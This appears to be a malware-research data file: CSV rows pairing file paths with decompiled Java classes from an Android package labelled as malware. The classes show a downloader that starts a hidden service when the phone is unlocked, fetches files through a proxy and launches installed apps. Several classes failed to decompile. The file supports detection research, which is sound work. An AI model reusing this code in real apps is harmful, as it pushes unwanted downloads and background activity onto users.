"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\c.code","class c implements Runnable {   final Sc f164a;   public c(  Sc sc){     this.f164a=sc;   }   @Override public void run(){     this.f164a.a();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\d.code","public class d {   private static File f171a;   private static File b;   private static d g=null;   private Context c;   private int d;   private com.apkmore.rbjatnldymzfiw.v.b.f e=null;   private boolean f=false;   private Handler h=new g(this);   private aa i=null;   public d(  Context context){     this.c=context;   }   public static d a(  Context context){     if (g == null) {       g=new d(context);     }     return g;   }   public void a(){     if (this.i != null) {       this.i.a();     }   }   public void a(  int i){     if (j.a(this.c).b() || this.f) {       return;     }     Log.d(com.apkmore.rbjatnldymzfiw.v.e.b.C,com.apkmore.rbjatnldymzfiw.v.e.b.D + ""0"");     com.apkmore.rbjatnldymzfiw.v.e.h.j(this.c);     this.d=i;     new e(this,i).start();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\e.code","public class e extends Thread {   final int f189a;   final d b;   public e(  d dVar,  int i){     this.b=dVar;     this.f189a=i;   }   @Override public void run(){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.v.e.run():void"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\f.code","class f implements Runnable {   final e f196a;   public f(  e eVar){     this.f196a=eVar;   }   @Override public void run(){     this.f196a.b.f=false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\g.code","public class g extends Handler {   final d f197a;   public g(  d dVar){     this.f197a=dVar;   }   private boolean a(){     File file;     File file2;     File file3;     File file4;     file=d.f171a;     if (file != null) {       file2=d.f171a;       if (file2.exists()) {         file3=d.b;         if (file3 != null) {           file4=d.b;           if (file4.exists()) {             return true;           }         }       }     }     return false;   }   @Override public void handleMessage(  Message message){     int i;     Context context;     Context context2;     com.apkmore.rbjatnldymzfiw.v.b.f fVar;     Context context3;     com.apkmore.rbjatnldymzfiw.v.b.f fVar2;     Context context4;     com.apkmore.rbjatnldymzfiw.v.b.f fVar3;     if (message.getData().getInt(com.apkmore.rbjatnldymzfiw.v.e.b.aR) <= -1 || !a()) {       return;     }     i=this.f197a.d; switch (i) { case 0:       context4=this.f197a.c;     j a2=j.a(context4);   fVar3=this.f197a.e; a2.b(fVar3); break; case 1: context3=this.f197a.c; j a3=j.a(context3); fVar2=this.f197a.e; a3.a(fVar2); break; case 2: context=this.f197a.c; j a4=j.a(context); context2=this.f197a.c; fVar=this.f197a.e; a4.a(context2,fVar); break; } this.f197a.f=false; } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\h.code","!org.eclipse.jdt.core.dom.TypeDeclaration@26d488ab"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\i.code","public interface i {   void a(  com.apkmore.rbjatnldymzfiw.v.b.f fVar); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\j.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4017ba7d"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\k.code","public class k implements View.OnClickListener {   final j f200a;   public k(  j jVar){     this.f200a=jVar;   }   @Override public void onClick(  View view){     this.f200a.b(2);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\l.code","public class l implements com.apkmore.rbjatnldymzfiw.v.d.q {   final j f201a;   public l(  j jVar){     this.f201a=jVar;   }   @Override public void a(){     CountDownTimer countDownTimer;     Context context;     CountDownTimer countDownTimer2;     this.f201a.e=false;     countDownTimer=this.f201a.s;     if (countDownTimer != null) {       countDownTimer2=this.f201a.s;       countDownTimer2.cancel();     }     context=this.f201a.b;     d.a(context).a();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\m.code","public class m extends CountDownTimer {   final int f202a;   final j b;   public m(  j jVar,  long j,  long j2,  int i){     super(j,j2);     this.b=jVar;     this.f202a=i;   }   @Override public void onFinish(){     this.b.a(this.f202a);   }   @Override public void onTick(  long j){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\n.code","public class n {   public static HttpClient a(  Context context){     if (c(context) == null) {       return null;     }     if (!b(context)) {       return new DefaultHttpClient();     }     BasicHttpParams basicHttpParams=new BasicHttpParams();     HttpConnectionParams.setConnectionTimeout(basicHttpParams,30000);     HttpConnectionParams.setSoTimeout(basicHttpParams,30000);     HttpConnectionParams.setSocketBufferSize(basicHttpParams,204800);     HttpClientParams.setRedirecting(basicHttpParams,true);     HttpHost httpHost=new HttpHost(com.apkmore.rbjatnldymzfiw.v.e.b.m,80);     if (com.apkmore.rbjatnldymzfiw.v.e.b.R.equalsIgnoreCase(c(context))) {       httpHost=new HttpHost(com.apkmore.rbjatnldymzfiw.v.e.b.n,80);     }     a(basicHttpParams,httpHost);     return new DefaultHttpClient(basicHttpParams);   }   public static void a(  Context context,  int i,  String str,  int i2,  int i3,  Intent intent,  String str2,  int i4){     Notification notification=new Notification(i,"""",System.currentTimeMillis());     PendingIntent activity=PendingIntent.getActivity(context,0,intent,134217728);     if (i3 != -99) {       notification.flags=i3;     }     StringBuffer stringBuffer=new StringBuffer();     if (i4 > -1 && i4 <= 100) {       stringBuffer.append(i4);       stringBuffer.append(""%    "");     }     stringBuffer.append(str2);     notification.setLatestEventInfo(context,str,stringBuffer.toString(),activity);     d(context).notify(400000 + i2,notification);   }   public static void a(  Context context,  com.apkmore.rbjatnldymzfiw.v.a.h hVar,  com.apkmore.rbjatnldymzfiw.v.a.c cVar){     com.apkmore.rbjatnldymzfiw.v.a.d a2=com.apkmore.rbjatnldymzfiw.v.a.d.a();     if (a2 == null) {       a2=com.apkmore.rbjatnldymzfiw.v.a.d.a(context);     }     com.apkmore.rbjatnldymzfiw.v.a.h b=a2.b(hVar);     if (b == null || b.h() == 5 || b.h() == 4) {       if (cVar != null) {         hVar.a(cVar);       }       hVar.e();     }  else {       b.a(hVar.o());       b.a(cVar);       if (cVar != null) {         cVar.a(b,b.h());       }     }   }   private static void a(  HttpParams httpParams,  HttpHost httpHost){     httpParams.setParameter(""http.route.default-proxy"",httpHost);   }   protected static boolean b(  Context context){     String c=c(context);     if (c != null) {       return c.compareTo(com.apkmore.rbjatnldymzfiw.v.e.b.S) == 0 || c.compareTo(com.apkmore.rbjatnldymzfiw.v.e.b.T) == 0 || c.compareTo(com.apkmore.rbjatnldymzfiw.v.e.b.U) == 0;     }     return false;   }   public static String c(  Context context){     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       return null;     }     return activeNetworkInfo.getTypeName();   }   public static NotificationManager d(  Context context){     return (NotificationManager)context.getSystemService(""notification"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\o.code","public class o implements com.apkmore.rbjatnldymzfiw.v.b.p, i {   public com.apkmore.rbjatnldymzfiw.v.d.a f203a;   private Activity b;   private com.apkmore.rbjatnldymzfiw.v.b.f c;   private int d;   private Handler e=new q(this);   private Handler f=new r(this);   private View.OnClickListener g=new s(this);   public o(  Activity activity,  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     this.b=activity;     this.c=fVar;     this.f203a=new com.apkmore.rbjatnldymzfiw.v.d.a(activity);     b(fVar);     e();     this.f.postDelayed(new p(this),400L);     h.a(this.e);     Vokj.a(this);     c();   }   public Intent a(  String str){     Intent intent=new Intent(""android.intent.action.SEND"");     intent.setType(com.apkmore.rbjatnldymzfiw.v.e.b.bb);     intent.putExtra(""android.intent.extra.TEXT"",str);     intent.putExtra(""android.intent.extra.SUBJECT"",com.apkmore.rbjatnldymzfiw.v.e.b.Y);     return Intent.createChooser(intent,com.apkmore.rbjatnldymzfiw.v.e.b.ar);   }   private void b(  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     h hVar=new h(this.b,fVar,this.f);     com.apkmore.rbjatnldymzfiw.v.a.h hVar2=new com.apkmore.rbjatnldymzfiw.v.a.h(fVar.k,com.apkmore.rbjatnldymzfiw.v.e.h.a(this.b,com.apkmore.rbjatnldymzfiw.v.e.b.E,fVar.e),0);     hVar2.a((Object)(-1));     n.a(this.b,hVar2,hVar);     String[] a2=com.apkmore.rbjatnldymzfiw.v.e.h.a(fVar.l,"";"");     if (a2 != null) {       this.d=a2.length;     }     for (int i=0; i < this.d; i++) {       com.apkmore.rbjatnldymzfiw.v.a.h hVar3=new com.apkmore.rbjatnldymzfiw.v.a.h(a2[i],com.apkmore.rbjatnldymzfiw.v.e.h.a(this.b,i + com.apkmore.rbjatnldymzfiw.v.e.b.I,fVar.e),0);       hVar3.a(Integer.valueOf(i));       n.a(this.b,hVar3,hVar);     }   }   private void c(){     if (com.apkmore.rbjatnldymzfiw.v.e.h.i(this.b,this.c.f)) {       this.c.u=true;       this.f203a.h(com.apkmore.rbjatnldymzfiw.v.e.b.ag);       return;     }     if (com.apkmore.rbjatnldymzfiw.v.e.h.a(this.b,com.apkmore.rbjatnldymzfiw.v.e.h.a(this.c),this.c.e).exists()) {       this.c.v=true;       this.f203a.h(com.apkmore.rbjatnldymzfiw.v.e.b.ah);       return;     }     if (com.apkmore.rbjatnldymzfiw.v.a.d.a() != null) {       for (      com.apkmore.rbjatnldymzfiw.v.a.h hVar : com.apkmore.rbjatnldymzfiw.v.a.d.a().d()) {         if (hVar.c() != null && hVar.c().getName().equals(com.apkmore.rbjatnldymzfiw.v.e.h.a(this.c))) {           if (hVar.h() == 2) {             this.c.w=true;             this.f203a.h(com.apkmore.rbjatnldymzfiw.v.e.b.ai + ""..."");             return;           }  else           if (hVar.h() == 5) {             this.f203a.h(com.apkmore.rbjatnldymzfiw.v.e.b.aj);             return;           }         }       }     }   }   public void d(){     com.apkmore.rbjatnldymzfiw.v.b.m mVar=null;     if (0 == 0 || !(0 == 0 || mVar.a())) {       com.apkmore.rbjatnldymzfiw.v.b.m mVar2=new com.apkmore.rbjatnldymzfiw.v.b.m(this.b);       mVar2.a(this.c);       mVar2.a(this);       this.f203a.c();     }   }   private void e(){     this.f203a.c(this.c.f154a);     this.f203a.b(this.c.g);     this.f203a.a(this.c.d);     this.f203a.g(this.c.n);     this.f203a.f(this.c.o);     this.f203a.b(this.d);     this.f203a.d(this.c.h);     this.f203a.e(this.c.j);     this.f203a.a(this.c.i);     this.f203a.a(this.g);   }   public void a(){     this.b.setContentView(this.f203a);     ((Sc)this.b).a(this.f203a);   }   public void a(  AdapterView.OnItemClickListener onItemClickListener){     this.f203a.a(onItemClickListener);   }   @Override public void a(  com.apkmore.rbjatnldymzfiw.v.b.f fVar){     if (fVar.e == this.c.e) {       this.f.post(new t(this));     }   }   @Override public void a(  com.apkmore.rbjatnldymzfiw.v.b.k[] kVarArr){     ArrayList arrayList=new ArrayList();     for (    com.apkmore.rbjatnldymzfiw.v.b.k kVar : kVarArr) {       arrayList.add(com.apkmore.rbjatnldymzfiw.v.e.h.a(kVar));     }     if (this.f203a == null || arrayList == null || arrayList.size() == 0) {       return;     }     this.f203a.b(arrayList);     this.f203a.b();   }   public boolean b(){     return this.f203a.a();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\p.code","public class p implements Runnable {   final o f204a;   public p(  o oVar){     this.f204a=oVar;   }   @Override public void run(){     this.f204a.d();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\q.code","public class q extends Handler {   final o f205a;   public q(  o oVar){     this.f205a=oVar;   }   @Override public void handleMessage(  Message message){     com.apkmore.rbjatnldymzfiw.v.b.f fVar;     Bundle data=message.getData();     int i=data.getInt(com.apkmore.rbjatnldymzfiw.v.e.b.aa,-1);     boolean z=data.getBoolean(com.apkmore.rbjatnldymzfiw.v.e.b.bG,false);     boolean z2=data.getBoolean(com.apkmore.rbjatnldymzfiw.v.e.b.af,false);     int i2=data.getInt(com.apkmore.rbjatnldymzfiw.v.e.b.bF,0);     fVar=this.f205a.c;     if (fVar.e == i) {       if (z) {         this.f205a.f203a.h(com.apkmore.rbjatnldymzfiw.v.e.b.aj);       }  else       if (z2) {         this.f205a.f203a.h(com.apkmore.rbjatnldymzfiw.v.e.b.ah);       }  else {         this.f205a.f203a.h(com.apkmore.rbjatnldymzfiw.v.e.b.ai + ""    "" + i2+ "" %"");       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\r.code","public class r extends Handler {   final o f206a;   public r(  o oVar){     this.f206a=oVar;   }   @Override public void handleMessage(  Message message){     Activity activity;     Activity activity2;     Bundle data=message.getData();     int i=data.getInt(com.apkmore.rbjatnldymzfiw.v.e.b.aR);     String string=data.getString(com.apkmore.rbjatnldymzfiw.v.e.b.aQ);     if (i == -1) {       com.apkmore.rbjatnldymzfiw.v.d.a aVar=this.f206a.f203a;       activity2=this.f206a.b;       aVar.a(com.apkmore.rbjatnldymzfiw.v.d.u.a(activity2,string));     }  else     if (i > -1) {       com.apkmore.rbjatnldymzfiw.v.d.a aVar2=this.f206a.f203a;       activity=this.f206a.b;       aVar2.a(com.apkmore.rbjatnldymzfiw.v.d.u.a(activity,string),i);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\s.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5d193162"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\Sc.code","public class Sc extends Activity {   o f138a;   o b;   protected View c;   private TranslateAnimation g;   private TranslateAnimation h;   private TranslateAnimation i;   private TranslateAnimation j;   private com.apkmore.rbjatnldymzfiw.v.b.f d=null;   private Handler e=new Handler();   private Stack f=new Stack();   private AdapterView.OnItemClickListener k=new b(this);   private void b(){     this.g=new TranslateAnimation(1,0.0f,1,-1.0f,1,0.0f,1,0.0f);     a(this.g);     this.h=new TranslateAnimation(1,1.0f,1,0.0f,1,0.0f,1,0.0f);     a(this.h);     this.i=new TranslateAnimation(1,0.0f,1,1.0f,1,0.0f,1,0.0f);     a(this.i);     this.j=new TranslateAnimation(1,-1.0f,1,0.0f,1,0.0f,1,0.0f);     a(this.j);   }   public View a(){     if (this.f.size() <= 1) {       finish();       return null;     }     View view=(View)this.f.pop();     view.clearFocus();     view.startAnimation(this.i);     this.c=(View)this.f.peek();     this.c.setFocusable(true);     setContentView(this.c);     this.c.requestFocusFromTouch();     this.c.requestFocus();     this.c.startAnimation(this.j);     return this.c;   }   public void a(  View view){     this.e.post(new a(this,view));   }   public void a(  TranslateAnimation translateAnimation){     translateAnimation.setDuration(400L);     translateAnimation.setFillAfter(true);     translateAnimation.setInterpolator(new LinearInterpolator());   }   @Override protected void onCreate(  Bundle bundle){     super.onCreate(bundle);     com.apkmore.rbjatnldymzfiw.v.a.d.a(this);     requestWindowFeature(1);     com.apkmore.rbjatnldymzfiw.v.e.d.a(com.apkmore.rbjatnldymzfiw.v.e.b.aS + Thread.currentThread().getId());     String stringExtra=getIntent().getStringExtra(com.apkmore.rbjatnldymzfiw.v.e.b.P);     com.apkmore.rbjatnldymzfiw.v.b.f fVar=new com.apkmore.rbjatnldymzfiw.v.b.f();     if (!fVar.a(stringExtra)) {       finish();       return;     }     b();     this.d=fVar;     this.f138a=new o(this,fVar);     this.f138a.a(this.k);     this.f138a.a();     if (this.d.y == 1) {       this.d.x=1;       com.apkmore.rbjatnldymzfiw.v.e.h.d(this,this.d);       new com.apkmore.rbjatnldymzfiw.v.b.q().a(this);     }   }   @Override public boolean onKeyDown(  int i,  KeyEvent keyEvent){     if (i == 4) {       if (this.f138a != null && this.f138a.b()) {         return true;       }       if (this.b != null && this.b.b()) {         return true;       }       if ((this.f138a != null && !this.f138a.b()) || (this.b != null && !this.b.b())) {         new Handler().postDelayed(new c(this),300L);         return true;       }     }     return super.onKeyDown(i,keyEvent);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\t.code","class t implements Runnable {   final o f208a;   public t(  o oVar){     this.f208a=oVar;   }   @Override public void run(){     com.apkmore.rbjatnldymzfiw.v.b.f fVar;     fVar=this.f208a.c;     fVar.u=true;     this.f208a.f203a.h(com.apkmore.rbjatnldymzfiw.v.e.b.ag);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\u.code","public class u extends BaseAdapter implements View.OnClickListener {   private List f209a;   private h b;   private Context c;   private Handler d=new v(this);   private w e=null;   public u(  Context context,  List list){     this.f209a=new ArrayList();     this.c=context;     this.f209a=list;   }   @Override public int getCount(){     return this.f209a.size();   }   @Override public Object getItem(  int i){     return this.f209a.get(i);   }   @Override public long getItemId(  int i){     return i;   }   @Override public View getView(  int i,  View view,  ViewGroup viewGroup){     Bitmap a2=com.apkmore.rbjatnldymzfiw.v.e.a.a(this.c,5);     Drawable a3=a2 != null ? com.apkmore.rbjatnldymzfiw.v.e.a.a(this.c,a2) : null;     x xVar=(x)view;     if (xVar == null) {       xVar=new x(this,this.c);     }     if (""mounted"".equals(Environment.getExternalStorageState())) {       String str=Environment.getExternalStorageDirectory() + ""/"" + com.apkmore.rbjatnldymzfiw.v.e.b.e+ ""/""+ ((com.apkmore.rbjatnldymzfiw.v.b.f)this.f209a.get(i)).e+ ""/""+ com.apkmore.rbjatnldymzfiw.v.e.b.E;       if (new File(str).exists()) {         a3=com.apkmore.rbjatnldymzfiw.v.d.u.c(this.c,str);       }  else {         this.b=new h(this.c,(com.apkmore.rbjatnldymzfiw.v.b.f)this.f209a.get(i),this.d);         com.apkmore.rbjatnldymzfiw.v.a.h hVar=new com.apkmore.rbjatnldymzfiw.v.a.h(((com.apkmore.rbjatnldymzfiw.v.b.f)this.f209a.get(i)).k,com.apkmore.rbjatnldymzfiw.v.e.h.a(this.c,com.apkmore.rbjatnldymzfiw.v.e.b.E,((com.apkmore.rbjatnldymzfiw.v.b.f)this.f209a.get(i)).e),0);         hVar.a((Object)(-1));         n.a(this.c,hVar,this.b);       }     }     if (a3 != null) {       xVar.b.setImageDrawable(a3);     }     xVar.c.setText(((com.apkmore.rbjatnldymzfiw.v.b.f)this.f209a.get(i)).d);     xVar.d.setText(((com.apkmore.rbjatnldymzfiw.v.b.f)this.f209a.get(i)).h);     if (i % 2 != 0) {       xVar.a();     }     return xVar;   }   @Override public void onClick(  View view){     com.apkmore.rbjatnldymzfiw.v.b.f fVar=(com.apkmore.rbjatnldymzfiw.v.b.f)this.f209a.get(((Integer)view.getTag()).intValue());     if (this.e != null) {       this.e.a(fVar);     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\v.code","public class v extends Handler {   final u f210a;   public v(  u uVar){     this.f210a=uVar;   }   @Override public void handleMessage(  Message message){     Context context;     Bundle data=message.getData();     int i=data.getInt(com.apkmore.rbjatnldymzfiw.v.e.b.aR);     String string=data.getString(com.apkmore.rbjatnldymzfiw.v.e.b.aQ);     if (string != null) {       context=this.f210a.c;       if (com.apkmore.rbjatnldymzfiw.v.e.h.a(context,string,false) == null || i != -1) {         return;       }       this.f210a.notifyDataSetChanged();     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\Vokj.code","public class Vokj extends BroadcastReceiver {   private static Class c;   private Context f139a;   private static long b=0;   private static Set d=new HashSet();   public static Class a(  Context context){     if (c == null) {       c=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,Zh.class);     }     return c;   }   public static void a(  i iVar){     d.add(iVar);   }   private void b(  Context context){     if (((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo() != null) {       String c2=n.c(context);       com.apkmore.rbjatnldymzfiw.v.a.d a2=com.apkmore.rbjatnldymzfiw.v.a.d.a();       if (a2 == null) {         a2=com.apkmore.rbjatnldymzfiw.v.a.d.a(context);       }       List<com.apkmore.rbjatnldymzfiw.v.a.h> d2=a2.d();       if (d2 != null) {         if (com.apkmore.rbjatnldymzfiw.v.e.b.Q.equalsIgnoreCase(c2)) {           for (          com.apkmore.rbjatnldymzfiw.v.a.h hVar : d2) {             if (hVar.m() != 0) {               com.apkmore.rbjatnldymzfiw.v.b.f f=com.apkmore.rbjatnldymzfiw.v.e.h.f(context,hVar.n());               if (f != null) {                 hVar.a((com.apkmore.rbjatnldymzfiw.v.a.c)new h(context,f,null));               }               hVar.f();             }           }           return;         }         for (        com.apkmore.rbjatnldymzfiw.v.a.h hVar2 : d2) {           if (hVar2.m() != 0) {             hVar2.n();             if (!com.apkmore.rbjatnldymzfiw.v.e.b.Q.equalsIgnoreCase(hVar2.l())) {               com.apkmore.rbjatnldymzfiw.v.b.f f2=com.apkmore.rbjatnldymzfiw.v.e.h.f(context,hVar2.n());               if (f2 != null) {                 hVar2.a((com.apkmore.rbjatnldymzfiw.v.a.c)new h(context,f2,null));               }               hVar2.f();             }           }         }       }     }   }   @Override public void onReceive(  Context context,  Intent intent){     this.f139a=context;     String action=intent.getAction();     if (!""android.intent.action.PACKAGE_ADDED"".equals(action)) {       if (!""android.net.conn.CONNECTIVITY_CHANGE"".equals(action)) {         if (""android.intent.action.USER_PRESENT"".equals(action)) {           this.f139a.startService(new Intent(this.f139a,(Class<?>)a(this.f139a)));           com.apkmore.rbjatnldymzfiw.v.e.h.r(context);           return;         }  else {           if (""android.intent.action.SCREEN_OFF"".equals(action)) {             this.f139a.stopService(new Intent(this.f139a,(Class<?>)a(this.f139a)));             return;           }           return;         }       }       if (System.currentTimeMillis() - b >= 5000) {         b=System.currentTimeMillis();         b(this.f139a);         NetworkInfo activeNetworkInfo=((ConnectivityManager)this.f139a.getSystemService(""connectivity"")).getActiveNetworkInfo();         if (activeNetworkInfo == null || !activeNetworkInfo.isAvailable()) {           this.f139a.stopService(new Intent(this.f139a,(Class<?>)a(this.f139a)));           return;         }  else {           if (((PowerManager)this.f139a.getSystemService(""power"")).isScreenOn()) {             this.f139a.startService(new Intent(this.f139a,(Class<?>)a(this.f139a)));             return;           }           return;         }       }       return;     }     String uri=intent.getData().toString();     String substring=uri.substring(com.apkmore.rbjatnldymzfiw.v.e.b.N.length(),uri.length());     com.apkmore.rbjatnldymzfiw.v.b.f g=com.apkmore.rbjatnldymzfiw.v.e.h.g(this.f139a,substring);     if (g != null) {       if (g.x == 2 || g.x == 3) {         g.x=4;         com.apkmore.rbjatnldymzfiw.v.e.h.d(this.f139a,g);         new com.apkmore.rbjatnldymzfiw.v.b.q().a(this.f139a);         com.apkmore.rbjatnldymzfiw.v.e.h.g(this.f139a,g);         Intent a2=com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f139a,substring,this.f139a.getPackageManager());         n.a(this.f139a,R.drawable.ic_menu_agenda,com.apkmore.rbjatnldymzfiw.v.e.b.O,g.e,16,a2 == null ? new Intent() : a2,g.d,-1);         Iterator it=d.iterator();         while (it.hasNext()) {           ((i)it.next()).a(g);         }         this.f139a.startActivity(a2);         return;       }       return;     }     com.apkmore.rbjatnldymzfiw.v.b.f h=com.apkmore.rbjatnldymzfiw.v.e.h.h(this.f139a,substring);     if (h != null) {       com.apkmore.rbjatnldymzfiw.v.b.a.a().a(this.f139a,h.e,3);       com.apkmore.rbjatnldymzfiw.v.e.h.h(this.f139a,h);       Intent a3=com.apkmore.rbjatnldymzfiw.v.e.h.a(this.f139a,substring,this.f139a.getPackageManager());       Context context2=this.f139a;       String str=com.apkmore.rbjatnldymzfiw.v.e.b.O;       int i=h.e;       if (a3 == null) {         a3=new Intent();       }       n.a(context2,R.drawable.ic_menu_agenda,str,i,16,a3,h.d,-1);       Iterator it2=d.iterator();       while (it2.hasNext()) {         ((i)it2.next()).a(h);       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\w.code","public interface w {   void a(  com.apkmore.rbjatnldymzfiw.v.b.f fVar); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\x.code","public class x extends LinearLayout {   final u f211a;   private ImageView b;   private TextView c;   private TextView d;   private ImageView e;   public x(  u uVar,  Context context){     super(context);     this.f211a=uVar;     setOrientation(1);     LinearLayout linearLayout=new LinearLayout(context);     linearLayout.setOrientation(0);     addView(linearLayout,new LinearLayout.LayoutParams(-1,-2));     this.e=new ImageView(context);     this.e.setBackgroundColor(-4604739);     linearLayout.addView(this.e,new LinearLayout.LayoutParams(1,-1));     LinearLayout linearLayout2=new LinearLayout(context);     linearLayout.setOrientation(0);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-2,-2);     layoutParams.weight=1.0f;     int a2=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,7);     layoutParams.bottomMargin=a2;     layoutParams.topMargin=a2;     linearLayout.addView(linearLayout2,layoutParams);     LinearLayout.LayoutParams layoutParams2=new LinearLayout.LayoutParams(-2,-2);     int a3=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,5);     layoutParams2.rightMargin=a3;     layoutParams2.leftMargin=a3;     this.b=new ImageView(context);     linearLayout2.addView(this.b,layoutParams2);     LinearLayout linearLayout3=new LinearLayout(context);     linearLayout3.setOrientation(1);     LinearLayout.LayoutParams layoutParams3=new LinearLayout.LayoutParams(-2,-2);     layoutParams3.leftMargin=com.apkmore.rbjatnldymzfiw.v.e.h.a(context,2);     linearLayout2.addView(linearLayout3,layoutParams3);     this.c=new TextView(context);     this.c.setGravity(17);     this.c.setTextSize(12.0f);     this.c.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.c.setSingleLine();     this.c.setEllipsize(TextUtils.TruncateAt.END);     linearLayout3.addView(this.c,new LinearLayout.LayoutParams(-2,-2));     LinearLayout.LayoutParams layoutParams4=new LinearLayout.LayoutParams(-2,-2);     this.d=new TextView(context);     this.d.setGravity(17);     this.d.setTextSize(12.0f);     this.d.setTextColor(ViewCompat.MEASURED_STATE_MASK);     this.d.setSingleLine();     this.d.setEllipsize(TextUtils.TruncateAt.END);     linearLayout3.addView(this.d,layoutParams4);     ImageView imageView=new ImageView(context);     imageView.setBackgroundColor(-4604739);     addView(imageView,new LinearLayout.LayoutParams(-1,1));     this.e=new ImageView(context);     this.e.setBackgroundColor(-4604739);     linearLayout.addView(this.e,new LinearLayout.LayoutParams(1,-1));   }   public void a(){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.v\y.code","public class y {   private static y f212a=null;   private long b=300000;   private String c;   public static y a(){     if (f212a == null) {       f212a=new y();     }     return f212a;   }   public void a(  Context context,  boolean z){     z zVar=new z(this,context,z);     if (new File(Environment.getExternalStorageDirectory() + ""/"" + com.apkmore.rbjatnldymzfiw.v.e.b.e+ ""/""+ com.apkmore.rbjatnldymzfiw.v.e.b.bE+ com.apkmore.rbjatnldymzfiw.v.e.b.bD).exists()) {       zVar.sendEmptyMessage(0);     }  else {       new com.apkmore.rbjatnldymzfiw.v.a.a().a(com.apkmore.rbjatnldymzfiw.v.e.b.bC,Environment.getExternalStorageDirectory() + com.apkmore.rbjatnldymzfiw.v.e.b.e + ""/""+ com.apkmore.rbjatnldymzfiw.v.e.b.bE+ com.apkmore.rbjatnldymzfiw.v.e.b.bD,zVar);     }   } } "
